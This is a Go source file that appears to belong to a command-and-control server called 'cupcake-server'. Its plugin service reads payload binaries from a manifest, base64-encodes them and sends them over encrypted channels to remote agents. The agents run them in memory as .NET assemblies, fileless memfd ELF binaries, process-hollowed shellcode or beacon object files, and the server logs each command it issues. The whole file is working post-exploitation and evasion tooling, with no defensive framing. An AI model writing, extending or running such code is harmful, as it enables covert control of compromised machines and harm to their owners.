package services

import (
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/store"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"sync"

	"github.com/google/uuid"
)

var (
	manifestMutex  sync.Mutex
	cachedManifest []PluginMetadata
	manifestLoaded bool
	pluginCache    = make(map[string][]byte)
)

// PluginMetadata matches the manifest.json structure
type PluginMetadata struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Description string `json:"description"`
	FileName    string `json:"file_name"`
	Type        string `json:"type"`       // "execute-assembly", "native-exec", "powershell", "memfd-exec", etc.
	Category    string `json:"category"`
	RequiredOS  string `json:"required_os"`
	Params      []interface{} `json:"params"`
}

// loadPluginManifestNoLock reads from disk without locking - internal use only
func loadPluginManifestNoLock() ([]PluginMetadata, error) {
	if manifestLoaded {
		return cachedManifest, nil
	}

	data, err := os.ReadFile("assets/plugins/manifest.json")
	if err != nil {
		return nil, fmt.Errorf("failed to read plugin manifest: %v", err)
	}

	var plugins []PluginMetadata
	if err := json.Unmarshal(data, &plugins); err != nil {
		return nil, fmt.Errorf("failed to parse plugin manifest: %v", err)
	}

	cachedManifest = plugins
	manifestLoaded = true
	return plugins, nil
}

// LoadPluginManifest reads the metadata from assets/plugins/manifest.json (Locked)
func LoadPluginManifest() ([]PluginMetadata, error) {
	manifestMutex.Lock()
	defer manifestMutex.Unlock()
	return loadPluginManifestNoLock()
}

// DeployPlugin reads the plugin binary and sends it to the agent via CMD_MEMORY_EXEC or specialized commands
// DeployPlugin reads the plugin binary and sends it to the agent via CMD_MEMORY_EXEC or specialized commands
func DeployPlugin(agentID string, pluginID string, args string) (string, error) {
	// 1. 获取客户端与锁
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return "", fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	// 2. 获取插件配置
	manifest, err := LoadPluginManifest()
	if err != nil {
		return "", err
	}

	var meta *PluginMetadata
	for _, p := range manifest {
		if p.ID == pluginID {
			meta = &p
			break
		}
	}

	if meta == nil {
		return "", fmt.Errorf("plugin %s not found", pluginID)
	}

	// 3. 读取插件文件
	manifestMutex.Lock()
	binData, ok := pluginCache[pluginID]
	manifestMutex.Unlock()

	if !ok {
		pluginPath := filepath.Join("assets/plugins", meta.FileName)
		var err error
		binData, err = os.ReadFile(pluginPath)
		if err != nil {
			return "", fmt.Errorf("failed to read plugin: %v", err)
		}
		manifestMutex.Lock()
		pluginCache[pluginID] = binData
		manifestMutex.Unlock()
	}

	// 4. 优化：检查客户端是否已缓存
	client.PluginMutex.RLock()
	cached := client.CachedPlugins[pluginID]
	client.PluginMutex.RUnlock()

	cmdType := "shell"
	content := args
	b64Data := ""

	if cached {
		log.Printf("[Plugin Optimization] Using cached version of %s for agent %s", pluginID, agentID)
		// 使用 cached:ID|args 语法触发客户端本地缓存执行
		switch meta.Type {
		case "execute-assembly":
			cmdType = "execute_assembly"
			content = fmt.Sprintf("cached:%s|%s", pluginID, args)
		case "memfd-exec", "linux-script":
			cmdType = "run_memfd_elf"
			content = fmt.Sprintf("cached:%s|%s", pluginID, args)
		case "shellcode-inject", "native-pe":
			cmdType = "hollow_shellcode"
			content = fmt.Sprintf("cached:%s|%s", pluginID, args)
		case "bof-exec":
			cmdType = "bof_exec"
			content = fmt.Sprintf("cached:%s|%s", pluginID, base64.StdEncoding.EncodeToString([]byte(args)))
		default:
			content = fmt.Sprintf("cached:%s|%s", pluginID, args)
		}
	} else {
		// 首次执行，下发完整二进制并标记缓存
		b64Data = base64.StdEncoding.EncodeToString(binData)
		switch meta.Type {
		case "execute-assembly":
			cmdType = "execute_assembly"
			if args != "" {
				content = fmt.Sprintf("%s|%s", args, b64Data)
			} else {
				content = b64Data
			}
		case "memfd-exec", "linux-script":
			cmdType = "run_memfd_elf"
			content = fmt.Sprintf("%s|%s", args, b64Data)
		case "shellcode-inject", "native-pe":
			cmdType = "hollow_shellcode"
			content = fmt.Sprintf("%s|%s", args, b64Data)
		case "bof-exec":
			cmdType = "bof_exec"
			content = base64.StdEncoding.EncodeToString([]byte(args))
		}

		// 异步标记已缓存
		client.PluginMutex.Lock()
		if client.CachedPlugins == nil {
			client.CachedPlugins = make(map[string]bool)
		}
		client.CachedPlugins[pluginID] = true
		client.PluginMutex.Unlock()
	}

	// 5. 封装并发送
	reqID := uuid.New().String()
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    cmdType,
			CommandContent: content,
			Data:           b64Data, // 在 execute_assembly 中被优先处理
			ReqID:          reqID,
		},
	}

	log.Printf("[Plugin] Running %s (%s) on %s, Args: %s", meta.Name, cmdType, agentID, args)

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return "", err
	}

	_ = store.CreateCommandLog(agentID, reqID, meta.Name, fmt.Sprintf("Args: %s", args))
	return reqID, nil
}

// AddPluginToManifest appends new plugin metadata to manifest.json
func AddPluginToManifest(plugin PluginMetadata) error {
	manifestMutex.Lock()
	defer manifestMutex.Unlock()

	manifest, err := loadPluginManifestNoLock()
	if err != nil {
		manifest = []PluginMetadata{}
	}

	// Double check for duplicate ID
	for _, p := range manifest {
		if p.ID == plugin.ID {
			return fmt.Errorf("plugin with ID %s already exists", plugin.ID)
		}
	}

	manifest = append(manifest, plugin)
	
	data, err := json.MarshalIndent(manifest, "", "  ")
	if err != nil {
		return err
	}

	err = os.WriteFile("assets/plugins/manifest.json", data, 0644)
	if err == nil {
		cachedManifest = manifest
		manifestLoaded = true
	}
	return err
}

// RemovePluginFromManifest removes plugin metadata from manifest.json
func RemovePluginFromManifest(pluginID string) (string, error) {
	manifestMutex.Lock()
	defer manifestMutex.Unlock()

	manifest, err := loadPluginManifestNoLock()
	if err != nil {
		return "", err
	}

	var updated []PluginMetadata
	var fileName string
	found := false

	for _, p := range manifest {
		if p.ID == pluginID {
			fileName = p.FileName
			found = true
			continue
		}
		updated = append(updated, p)
	}

	if !found {
		return "", fmt.Errorf("plugin with ID %s not found", pluginID)
	}

	data, err := json.MarshalIndent(updated, "", "  ")
	if err != nil {
		return "", err
	}

	if err := os.WriteFile("assets/plugins/manifest.json", data, 0644); err != nil {
		return "", err
	}
	
	cachedManifest = updated
	manifestLoaded = true
	delete(pluginCache, pluginID)

	return fileName, nil
}
